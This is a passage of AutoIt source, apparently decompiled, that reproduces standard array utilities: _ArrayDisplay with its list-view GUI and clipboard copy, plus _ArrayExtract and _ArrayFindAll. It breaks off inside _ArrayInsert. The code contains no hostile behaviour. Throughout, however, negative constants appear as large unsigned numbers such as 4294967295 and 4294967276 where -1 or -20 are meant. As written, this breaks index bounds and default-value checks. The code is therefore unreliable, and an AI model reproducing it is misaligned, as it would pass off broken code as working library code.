			If $AARRAY [ $IREADFROM_INDEX ] [ 0 ] == ChrW ( 64177 ) Then
				ContinueLoop
			Else
				If $IREADFROM_INDEX <> $ICOPYTO_INDEX Then
					For $J = 0 To $IDIM_2
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $AARRAY [ $IREADFROM_INDEX ] [ $J ]
					Next
				EndIf
				$ICOPYTO_INDEX += 1
			EndIf
		Next
		ReDim $AARRAY [ $IDIM_1 - $VRANGE [ 0 ] + 1 ] [ $IDIM_2 + 1 ]
Case Else
		Return SetError ( 2 , 0 , False )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS )
EndFunc
Func _ARRAYDISPLAY ( Const ByRef $AARRAY , $STITLE = Default , $SARRAYRANGE = Default , $IFLAGS = Default , $VUSER_SEPARATOR = Default , $SHEADER = Default , $IMAX_COLWIDTH = Default , $IALT_COLOR = Default , $HUSER_FUNCTION = Default )
	If $STITLE = Default Then $STITLE = "ArrayDisplay"
	If $SARRAYRANGE = Default Then $SARRAYRANGE = ""
	If $IFLAGS = Default Then $IFLAGS = 0
	If $VUSER_SEPARATOR = Default Then $VUSER_SEPARATOR = ""
	If $SHEADER = Default Then $SHEADER = ""
	If $IMAX_COLWIDTH = Default Then $IMAX_COLWIDTH = 350
	If $IALT_COLOR = Default Then $IALT_COLOR = 0
	If $HUSER_FUNCTION = Default Then $HUSER_FUNCTION = 0
	Local $ITRANSPOSE = BitAND ( $IFLAGS , 1 )
	Local $ICOLALIGN = BitAND ( $IFLAGS , 6 )
	Local $IVERBOSE = BitAND ( $IFLAGS , 8 )
	Local $IBUTTONMARGIN = ( ( BitAND ( $IFLAGS , 32 ) ) ? ( 0 ) : ( ( BitAND ( $IFLAGS , 16 ) ) ? ( 20 ) : ( 40 ) ) )
	Local $INOROW = BitAND ( $IFLAGS , 64 )
	Local $SMSG = "" , $IRET = 1
	If IsArray ( $AARRAY ) Then
		Local $IDIMENSION = UBound ( $AARRAY , $UBOUND_DIMENSIONS ) , $IROWCOUNT = UBound ( $AARRAY , $UBOUND_ROWS ) , $ICOLCOUNT = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $IDIMENSION > 2 Then
			$SMSG = "Larger than 2D array passed to function"
			$IRET = 2
		EndIf
	Else
		$SMSG = "No array variable passed to function"
	EndIf
	If $SMSG Then
		If $IVERBOSE And MsgBox ( $MB_SYSTEMMODAL + $MB_ICONERROR + $MB_YESNO , "ArrayDisplay Error: " & $STITLE , $SMSG & @CRLF & @CRLF & "Exit the script?" ) = $IDYES Then
			Exit
		Else
			Return SetError ( $IRET , 0 , "" )
		EndIf
	EndIf
	Local $ICW_COLWIDTH = Number ( $VUSER_SEPARATOR )
	Local $SAD_SEPARATOR = ChrW ( 64177 )
	Local $SCURR_SEPARATOR = Opt ( "GUIDataSeparatorChar" , $SAD_SEPARATOR )
	If $VUSER_SEPARATOR = "" Then $VUSER_SEPARATOR = $SCURR_SEPARATOR
	Local $VTMP , $IROWLIMIT = 65525 , $ICOLLIMIT = 250
	Local $IDATAROW = $IROWCOUNT
	Local $IDATACOL = $ICOLCOUNT
	Local $IITEM_START = 0 , $IITEM_END = $IROWCOUNT + 4294967295 , $ISUBITEM_START = 0 , $ISUBITEM_END = ( ( $IDIMENSION = 2 ) ? ( $ICOLCOUNT + 4294967295 ) : ( 0 ) )
	Local $BRANGE_FLAG = False , $AVRANGESPLIT
	If $SARRAYRANGE Then
		Local $AARRAY_RANGE = StringRegExp ( $SARRAYRANGE & "||" , "(?U)(.*)\|" , 3 )
		If $AARRAY_RANGE [ 0 ] Then
			$AVRANGESPLIT = StringSplit ( $AARRAY_RANGE [ 0 ] , ":" )
			If @error Then
				$IITEM_END = Number ( $AVRANGESPLIT [ 1 ] )
			Else
				$IITEM_START = Number ( $AVRANGESPLIT [ 1 ] )
				$IITEM_END = Number ( $AVRANGESPLIT [ 2 ] )
			EndIf
		EndIf
		If $IITEM_START > $IITEM_END Then
			$VTMP = $IITEM_START
			$IITEM_START = $IITEM_END
			$IITEM_END = $VTMP
		EndIf
		If $IITEM_START < 0 Then $IITEM_START = 0
		If $IITEM_END > $IROWCOUNT + 4294967295 Then $IITEM_END = $IROWCOUNT + 4294967295
		If $IITEM_START <> 0 Or $IITEM_END <> $IROWCOUNT + 4294967295 Then $BRANGE_FLAG = True
		If $IDIMENSION = 2 And $AARRAY_RANGE [ 1 ] Then
			$AVRANGESPLIT = StringSplit ( $AARRAY_RANGE [ 1 ] , ":" )
			If @error Then
				$ISUBITEM_END = Number ( $AVRANGESPLIT [ 1 ] )
			Else
				$ISUBITEM_START = Number ( $AVRANGESPLIT [ 1 ] )
				$ISUBITEM_END = Number ( $AVRANGESPLIT [ 2 ] )
			EndIf
			If $ISUBITEM_START > $ISUBITEM_END Then
				$VTMP = $ISUBITEM_START
				$ISUBITEM_START = $ISUBITEM_END
				$ISUBITEM_END = $VTMP
			EndIf
			If $ISUBITEM_START < 0 Then $ISUBITEM_START = 0
			If $ISUBITEM_END > $ICOLCOUNT + 4294967295 Then $ISUBITEM_END = $ICOLCOUNT + 4294967295
			If $ISUBITEM_START <> 0 Or $ISUBITEM_END <> $ICOLCOUNT + 4294967295 Then $BRANGE_FLAG = True
		EndIf
	EndIf
	Local $SDISPLAYDATA = "[" & $IDATAROW
	Local $BTRUNCATED = False
	If $ITRANSPOSE Then
		If $IITEM_END - $IITEM_START > $ICOLLIMIT Then
			$BTRUNCATED = True
			$IITEM_END = $IITEM_START + $ICOLLIMIT + 4294967295
		EndIf
	Else
		If $IITEM_END - $IITEM_START > $IROWLIMIT Then
			$BTRUNCATED = True
			$IITEM_END = $IITEM_START + $IROWLIMIT + 4294967295
		EndIf
	EndIf
	If $BTRUNCATED Then
		$SDISPLAYDATA &= "*]"
	Else
		$SDISPLAYDATA &= "]"
	EndIf
	If $IDIMENSION = 2 Then
		$SDISPLAYDATA &= " [" & $IDATACOL
		If $ITRANSPOSE Then
			If $ISUBITEM_END - $ISUBITEM_START > $IROWLIMIT Then
				$BTRUNCATED = True
				$ISUBITEM_END = $ISUBITEM_START + $IROWLIMIT + 4294967295
			EndIf
		Else
			If $ISUBITEM_END - $ISUBITEM_START > $ICOLLIMIT Then
				$BTRUNCATED = True
				$ISUBITEM_END = $ISUBITEM_START + $ICOLLIMIT + 4294967295
			EndIf
		EndIf
		If $BTRUNCATED Then
			$SDISPLAYDATA &= "*]"
		Else
			$SDISPLAYDATA &= "]"
		EndIf
	EndIf
	Local $STIPDATA = ""
	If $BTRUNCATED Then $STIPDATA &= "Truncated"
	If $BRANGE_FLAG Then
		If $STIPDATA Then $STIPDATA &= " - "
		$STIPDATA &= "Range set"
	EndIf
	If $ITRANSPOSE Then
		If $STIPDATA Then $STIPDATA &= " - "
		$STIPDATA &= "Transposed"
	EndIf
	Local $ASHEADER = StringSplit ( $SHEADER , $SCURR_SEPARATOR , $STR_NOCOUNT )
	If UBound ( $ASHEADER ) = 0 Then Local $ASHEADER [ 1 ] = [ "" ]
	$SHEADER = "Row"
	Local $IINDEX = $ISUBITEM_START
	If $ITRANSPOSE Then
		For $J = $IITEM_START To $IITEM_END
			$SHEADER &= $SAD_SEPARATOR & "Col " & $J
		Next
	Else
		If $ASHEADER [ 0 ] Then
			For $IINDEX = $ISUBITEM_START To $ISUBITEM_END
				If $IINDEX >= UBound ( $ASHEADER ) Then ExitLoop
				$SHEADER &= $SAD_SEPARATOR & $ASHEADER [ $IINDEX ]
			Next
		EndIf
		For $J = $IINDEX To $ISUBITEM_END
			$SHEADER &= $SAD_SEPARATOR & "Col " & $J
		Next
	EndIf
	If $INOROW Then $SHEADER = StringTrimLeft ( $SHEADER , 4 )
	If $IVERBOSE And ( $IITEM_END - $IITEM_START + 1 ) * ( $ISUBITEM_END - $ISUBITEM_START + 1 ) > 10000 Then
		SplashTextOn ( "ArrayDisplay" , "Preparing display" & @CRLF & @CRLF & "Please be patient" , 300 , 100 )
	EndIf
	Local $IBUFFER = 4094
	If $ITRANSPOSE Then
		$VTMP = $IITEM_START
		$IITEM_START = $ISUBITEM_START
		$ISUBITEM_START = $VTMP
		$VTMP = $IITEM_END
		$IITEM_END = $ISUBITEM_END
		$ISUBITEM_END = $VTMP
	EndIf
	Local $AVARRAYTEXT [ $IITEM_END - $IITEM_START + 1 ]
	For $I = $IITEM_START To $IITEM_END
		If Not $INOROW Then $AVARRAYTEXT [ $I - $IITEM_START ] = "[" & $I & "]"
		For $J = $ISUBITEM_START To $ISUBITEM_END
			If $IDIMENSION = 1 Then
				If $ITRANSPOSE Then
					Switch VarGetType ( $AARRAY [ $J ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $J ]
					EndSwitch
				Else
					Switch VarGetType ( $AARRAY [ $I ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $I ]
					EndSwitch
				EndIf
			Else
				If $ITRANSPOSE Then
					Switch VarGetType ( $AARRAY [ $J ] [ $I ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $J ] [ $I ]
					EndSwitch
				Else
					Switch VarGetType ( $AARRAY [ $I ] [ $J ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $I ] [ $J ]
					EndSwitch
				EndIf
			EndIf
			If StringLen ( $VTMP ) > $IBUFFER Then $VTMP = StringLeft ( $VTMP , $IBUFFER )
			$AVARRAYTEXT [ $I - $IITEM_START ] &= $SAD_SEPARATOR & $VTMP
		Next
		If $INOROW Then $AVARRAYTEXT [ $I - $IITEM_START ] = StringTrimLeft ( $AVARRAYTEXT [ $I - $IITEM_START ] , 1 )
	Next
	Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 64
	Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 102
	Local Const $_ARRAYCONSTANT_GUI_DOCKHEIGHT = 512
	Local Const $_ARRAYCONSTANT_GUI_DOCKLEFT = 2
	Local Const $_ARRAYCONSTANT_GUI_DOCKRIGHT = 4
	Local Const $_ARRAYCONSTANT_GUI_DOCKHCENTER = 8
	Local Const $_ARRAYCONSTANT_GUI_EVENT_CLOSE = + 4294967293
	Local Const $_ARRAYCONSTANT_GUI_FOCUS = 256
	Local Const $_ARRAYCONSTANT_GUI_BKCOLOR_LV_ALTERNATE = 4261412864
	Local Const $_ARRAYCONSTANT_SS_CENTER = 1
	Local Const $_ARRAYCONSTANT_SS_CENTERIMAGE = 512
	Local Const $_ARRAYCONSTANT_LVM_GETITEMCOUNT = ( 4096 + 4 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMRECT = ( 4096 + 14 )
	Local Const $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH = ( 4096 + 29 )
	Local Const $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH = ( 4096 + 30 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMSTATE = ( 4096 + 44 )
	Local Const $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT = ( 4096 + 50 )
	Local Const $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE = ( 4096 + 54 )
	Local Const $_ARRAYCONSTANT_LVS_EX_GRIDLINES = 1
	Local Const $_ARRAYCONSTANT_LVIS_SELECTED = 2
	Local Const $_ARRAYCONSTANT_LVS_SHOWSELALWAYS = 8
	Local Const $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT = 32
	Local Const $_ARRAYCONSTANT_WS_EX_CLIENTEDGE = 512
	Local Const $_ARRAYCONSTANT_WS_MAXIMIZEBOX = 65536
	Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 131072
	Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 262144
	Local Const $_ARRAYCONSTANT_WM_SETREDRAW = 11
	Local Const $_ARRAYCONSTANT_LVSCW_AUTOSIZE = + 4294967295
	Local $ICOORDMODE = Opt ( "GUICoordMode" , 1 )
	Local $IORGWIDTH = 210 , $IHEIGHT = 200 , $IMINSIZE = 250
	Local $HGUI = GUICreate ( $STITLE , $IORGWIDTH , $IHEIGHT , Default , Default , BitOR ( $_ARRAYCONSTANT_WS_SIZEBOX , $_ARRAYCONSTANT_WS_MINIMIZEBOX , $_ARRAYCONSTANT_WS_MAXIMIZEBOX ) )
	Local $AIGUISIZE = WinGetClientSize ( $HGUI )
	Local $IBUTTONWIDTH_2 = $AIGUISIZE [ 0 ] / 2
	Local $IBUTTONWIDTH_3 = $AIGUISIZE [ 0 ] / 3
	Local $IDLISTVIEW = GUICtrlCreateListView ( $SHEADER , 0 , 0 , $AIGUISIZE [ 0 ] , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $_ARRAYCONSTANT_LVS_SHOWSELALWAYS )
	GUICtrlSetBkColor ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_BKCOLOR_LV_ALTERNATE )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_GRIDLINES , $_ARRAYCONSTANT_LVS_EX_GRIDLINES )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE )
	Local $IDCOPY_ID = 9999 , $IDCOPY_DATA = 99999 , $IDDATA_LABEL = 99999 , $IDUSER_FUNC = 99999 , $IDEXIT_SCRIPT = 99999
	If $IBUTTONMARGIN Then
		$IDCOPY_ID = GUICtrlCreateButton ( "Copy Data && Hdr/Row" , 0 , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $IBUTTONWIDTH_2 , 20 )
		$IDCOPY_DATA = GUICtrlCreateButton ( "Copy Data Only" , $IBUTTONWIDTH_2 , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $IBUTTONWIDTH_2 , 20 )
		If $IBUTTONMARGIN = 40 Then
			Local $IBUTTONWIDTH_VAR = $IBUTTONWIDTH_2
			Local $IOFFSET = $IBUTTONWIDTH_2
			If IsFunc ( $HUSER_FUNCTION ) Then
				$IDUSER_FUNC = GUICtrlCreateButton ( "Run User Func" , $IBUTTONWIDTH_3 , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_3 , 20 )
				$IBUTTONWIDTH_VAR = $IBUTTONWIDTH_3
				$IOFFSET = $IBUTTONWIDTH_3 * 2
			EndIf
			$IDEXIT_SCRIPT = GUICtrlCreateButton ( "Exit Script" , $IOFFSET , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_VAR , 20 )
			$IDDATA_LABEL = GUICtrlCreateLabel ( $SDISPLAYDATA , 0 , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_VAR , 18 , BitOR ( $_ARRAYCONSTANT_SS_CENTER , $_ARRAYCONSTANT_SS_CENTERIMAGE ) )
			Select
			Case $BTRUNCATED Or $ITRANSPOSE Or $BRANGE_FLAG
				GUICtrlSetColor ( $IDDATA_LABEL , 16711680 )
				GUICtrlSetTip ( $IDDATA_LABEL , $STIPDATA )
			EndSelect
		EndIf
	EndIf
	GUICtrlSetResizing ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_DOCKBORDERS )
	GUICtrlSetResizing ( $IDCOPY_ID , $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDCOPY_DATA , $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDDATA_LABEL , $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDUSER_FUNC , $_ARRAYCONSTANT_GUI_DOCKHCENTER + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDEXIT_SCRIPT , $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_WM_SETREDRAW , 0 , 0 )
	Local $IDITEM
	For $I = 0 To UBound ( $AVARRAYTEXT ) + 4294967295
		$IDITEM = GUICtrlCreateListViewItem ( $AVARRAYTEXT [ $I ] , $IDLISTVIEW )
		If $IALT_COLOR Then
			GUICtrlSetBkColor ( $IDITEM , $IALT_COLOR )
		EndIf
	Next
	If $ICOLALIGN Then
		Local Const $_ARRAYCONSTANT_LVCF_FMT = 1
		Local Const $_ARRAYCONSTANT_LVM_SETCOLUMNW = ( 4096 + 96 )
		Local $TCOLUMN = DllStructCreate ( "uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal" )
		DllStructSetData ( $TCOLUMN , "Mask" , $_ARRAYCONSTANT_LVCF_FMT )
		DllStructSetData ( $TCOLUMN , "Fmt" , $ICOLALIGN / 2 )
		Local $PCOLUMN = DllStructGetPtr ( $TCOLUMN )
		For $I = 1 To $ISUBITEM_END - $ISUBITEM_START + 1
			GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNW , $I , $PCOLUMN )
		Next
	EndIf
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_WM_SETREDRAW , 1 , 0 )
	Local $IBORDER = 45
	If UBound ( $AVARRAYTEXT ) > 20 Then
		$IBORDER += 20
	EndIf
	Local $IWIDTH = $IBORDER , $ICOLWIDTH = 0 , $AICOLWIDTH [ $ISUBITEM_END - $ISUBITEM_START + 2 ] , $IMIN_COLWIDTH = 55
	For $I = 0 To $ISUBITEM_END - $ISUBITEM_START + 1
		GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $_ARRAYCONSTANT_LVSCW_AUTOSIZE )
		$ICOLWIDTH = GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH , $I , 0 )
		If $ICOLWIDTH < $IMIN_COLWIDTH Then
			GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $IMIN_COLWIDTH )
			$ICOLWIDTH = $IMIN_COLWIDTH
		EndIf
		$IWIDTH += $ICOLWIDTH
		$AICOLWIDTH [ $I ] = $ICOLWIDTH
	Next
	If $INOROW Then $IWIDTH -= 55
	If $IWIDTH > @DesktopWidth + 4294967196 Then
		$IWIDTH = $IBORDER
		For $I = 0 To $ISUBITEM_END - $ISUBITEM_START + 1
			If $AICOLWIDTH [ $I ] > $IMAX_COLWIDTH Then
				GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $IMAX_COLWIDTH )
				$IWIDTH += $IMAX_COLWIDTH
			Else
				$IWIDTH += $AICOLWIDTH [ $I ]
			EndIf
		Next
	EndIf
	If $IWIDTH > @DesktopWidth + 4294967196 Then
		$IWIDTH = @DesktopWidth + 4294967196
	ElseIf $IWIDTH < $IMINSIZE Then
		$IWIDTH = $IMINSIZE
	EndIf
	Local $TRECT = DllStructCreate ( "struct; long Left;long Top;long Right;long Bottom; endstruct" )
	DllCall ( "user32.dll" , "struct*" , "SendMessageW" , "hwnd" , GUICtrlGetHandle ( $IDLISTVIEW ) , "uint" , $_ARRAYCONSTANT_LVM_GETITEMRECT , "wparam" , 0 , "struct*" , $TRECT )
	Local $AIWIN_POS = WinGetPos ( $HGUI )
	Local $AILV_POS = ControlGetPos ( $HGUI , "" , $IDLISTVIEW )
	$IHEIGHT = ( ( UBound ( $AVARRAYTEXT ) + 2 ) * ( DllStructGetData ( $TRECT , "Bottom" ) - DllStructGetData ( $TRECT , "Top" ) ) ) + $AIWIN_POS [ 3 ] - $AILV_POS [ 3 ]
	If $IHEIGHT > @DesktopHeight + 4294967196 Then
		$IHEIGHT = @DesktopHeight + 4294967196
	ElseIf $IHEIGHT < $IMINSIZE Then
		$IHEIGHT = $IMINSIZE
	EndIf
	If $IVERBOSE Then SplashOff ( )
	GUISetState ( @SW_HIDE , $HGUI )
	WinMove ( $HGUI , "" , ( @DesktopWidth - $IWIDTH ) / 2 , ( @DesktopHeight - $IHEIGHT ) / 2 , $IWIDTH , $IHEIGHT )
	GUISetState ( @SW_SHOW , $HGUI )
	Local $IONEVENTMODE = Opt ( "GUIOnEventMode" , 0 ) , $IMSG
	While 1
		$IMSG = GUIGetMsg ( )
		Switch $IMSG
		Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
			ExitLoop
		Case $IDCOPY_ID , $IDCOPY_DATA
			Local $ISEL_COUNT = GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT , 0 , 0 )
			If $IVERBOSE And ( Not $ISEL_COUNT ) And ( $IITEM_END - $IITEM_START ) * ( $ISUBITEM_END - $ISUBITEM_START ) > 10000 Then
				SplashTextOn ( "ArrayDisplay" , "Copying data" & @CRLF & @CRLF & "Please be patient" , 300 , 100 )
			EndIf
			Local $SCLIP = "" , $SITEM , $ASPLIT
			For $I = 0 To $IITEM_END - $IITEM_START
				If $ISEL_COUNT And Not ( GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMSTATE , $I , $_ARRAYCONSTANT_LVIS_SELECTED ) ) Then
					ContinueLoop
				EndIf
				$SITEM = $AVARRAYTEXT [ $I ]
				If $IMSG = $IDCOPY_DATA Then
					$SITEM = StringRegExpReplace ( $SITEM , "^\[\d+\].(.*)$" , "$1" )
				EndIf
				If $ICW_COLWIDTH Then
					$ASPLIT = StringSplit ( $SITEM , $SAD_SEPARATOR )
					$SITEM = ""
					For $J = 1 To $ASPLIT [ 0 ]
						$SITEM &= StringFormat ( "%-" & $ICW_COLWIDTH + 1 & "s" , StringLeft ( $ASPLIT [ $J ] , $ICW_COLWIDTH ) )
					Next
				Else
					$SITEM = StringReplace ( $SITEM , $SAD_SEPARATOR , $VUSER_SEPARATOR )
				EndIf
				$SCLIP &= $SITEM & @CRLF
			Next
			If $IMSG = $IDCOPY_ID Then
				If $ICW_COLWIDTH Then
					$ASPLIT = StringSplit ( $SHEADER , $SAD_SEPARATOR )
					$SITEM = ""
					For $J = 1 To $ASPLIT [ 0 ]
						$SITEM &= StringFormat ( "%-" & $ICW_COLWIDTH + 1 & "s" , StringLeft ( $ASPLIT [ $J ] , $ICW_COLWIDTH ) )
					Next
				Else
					$SITEM = StringReplace ( $SHEADER , $SAD_SEPARATOR , $VUSER_SEPARATOR )
				EndIf
				$SCLIP = $SITEM & @CRLF & $SCLIP
			EndIf
			ClipPut ( $SCLIP )
			SplashOff ( )
			GUICtrlSetState ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_FOCUS )
		Case $IDUSER_FUNC
			Local $AISELITEMS [ $IROWLIMIT ] = [ 0 ]
			For $I = 0 To GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMCOUNT , 0 , 0 )
				If GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMSTATE , $I , $_ARRAYCONSTANT_LVIS_SELECTED ) Then
					$AISELITEMS [ 0 ] += 1
					$AISELITEMS [ $AISELITEMS [ 0 ] ] = $I + $IITEM_START
				EndIf
			Next
			ReDim $AISELITEMS [ $AISELITEMS [ 0 ] + 1 ]
			$HUSER_FUNCTION ( $AARRAY , $AISELITEMS )
			GUICtrlSetState ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_FOCUS )
		Case $IDEXIT_SCRIPT
			GUIDelete ( $HGUI )
			Exit
		EndSwitch
	WEnd
	GUIDelete ( $HGUI )
	Opt ( "GUICoordMode" , $ICOORDMODE )
	Opt ( "GUIOnEventMode" , $IONEVENTMODE )
	Opt ( "GUIDataSeparatorChar" , $SCURR_SEPARATOR )
	Return 1
EndFunc
Func _ARRAYEXTRACT ( Const ByRef $AARRAY , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	If $ISTART_ROW = Default Then $ISTART_ROW = + 4294967295
	If $IEND_ROW = Default Then $IEND_ROW = + 4294967295
	If $ISTART_COL = Default Then $ISTART_COL = + 4294967295
	If $IEND_COL = Default Then $IEND_COL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IEND_ROW = + 4294967295 Then $IEND_ROW = $IDIM_1
	If $ISTART_ROW = + 4294967295 Then $ISTART_ROW = 0
	If $ISTART_ROW < + 4294967295 Or $IEND_ROW < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IDIM_1 Or $IEND_ROW > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ]
		For $I = 0 To $IEND_ROW - $ISTART_ROW
			$ARETARRAY [ $I ] = $AARRAY [ $I + $ISTART_ROW ]
		Next
		Return $ARETARRAY
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $IEND_COL = + 4294967295 Then $IEND_COL = $IDIM_2
		If $ISTART_COL = + 4294967295 Then $ISTART_COL = 0
		If $ISTART_COL < + 4294967295 Or $IEND_COL < + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IDIM_2 Or $IEND_COL > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IEND_COL Then Return SetError ( 6 , 0 , + 4294967295 )
		If $ISTART_COL = $IEND_COL Then
			Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ]
		Else
			Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ] [ $IEND_COL - $ISTART_COL + 1 ]
		EndIf
		For $I = 0 To $IEND_ROW - $ISTART_ROW
			For $J = 0 To $IEND_COL - $ISTART_COL
				If $ISTART_COL = $IEND_COL Then
					$ARETARRAY [ $I ] = $AARRAY [ $I + $ISTART_ROW ] [ $J + $ISTART_COL ]
				Else
					$ARETARRAY [ $I ] [ $J ] = $AARRAY [ $I + $ISTART_ROW ] [ $J + $ISTART_COL ]
				EndIf
			Next
		Next
		Return $ARETARRAY
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYFINDALL ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $ISUBITEM = 0 , $BROW = False )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOMPARE = Default Then $ICOMPARE = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If $BROW = Default Then $BROW = False
	$ISTART = _ARRAYSEARCH ( $AARRAY , $VVALUE , $ISTART , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM , $BROW )
	If @error Then Return SetError ( @error , 0 , + 4294967295 )
	Local $IINDEX = 0 , $AVRESULT [ UBound ( $AARRAY , ( $BROW ? $UBOUND_COLUMNS : $UBOUND_ROWS ) ) ]
	Do
		$AVRESULT [ $IINDEX ] = $ISTART
		$IINDEX += 1
		$ISTART = _ARRAYSEARCH ( $AARRAY , $VVALUE , $ISTART + 1 , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM , $BROW )
	Until @error
	ReDim $AVRESULT [ $IINDEX ]
	Return $AVRESULT
EndFunc
Func _ARRAYINSERT ( ByRef $AARRAY , $VRANGE , $VVALUE = "" , $ISTART = 0 , $SDELIM_ITEM = "|" , $SDELIM_ROW = @CRLF , $IFORCE = $ARRAYFILL_FORCE_DEFAULT )
	If $VVALUE = Default Then $VVALUE = ""
	If $ISTART = Default Then $ISTART = 0
	If $SDELIM_ITEM = Default Then $SDELIM_ITEM = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $IFORCE = Default Then $IFORCE = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	Local $HDATATYPE = 0
	Switch $IFORCE
	Case $ARRAYFILL_FORCE_INT
		$HDATATYPE = Int
	Case $ARRAYFILL_FORCE_NUMBER
		$HDATATYPE = Number
	Case $ARRAYFILL_FORCE_PTR
		$HDATATYPE = Ptr
	Case $ARRAYFILL_FORCE_HWND
		$HDATATYPE = HWnd
